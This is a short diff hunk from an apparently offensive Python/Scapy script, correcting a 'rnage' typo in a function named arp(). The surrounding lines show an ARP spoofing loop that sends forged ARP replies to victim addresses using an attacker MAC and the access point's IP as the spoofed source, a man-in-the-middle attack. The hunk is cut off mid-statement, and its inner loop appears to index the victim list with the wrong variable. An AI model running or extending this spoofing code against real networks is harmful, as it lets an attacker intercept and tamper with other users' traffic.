@@ -74,7 +74,7 @@ def arp():
 	
 	# for i in range(len(vip)):
 
-	for v in rnage(len(vip)):
+	for v in range(len(vip)):
 		for i in range(10):
 			print('send arp ', i)
 			sendp(Ether(dst=vip[i], src=attacker_mac)/ARP(pdst=vip[i], psrc=ap_ip, 
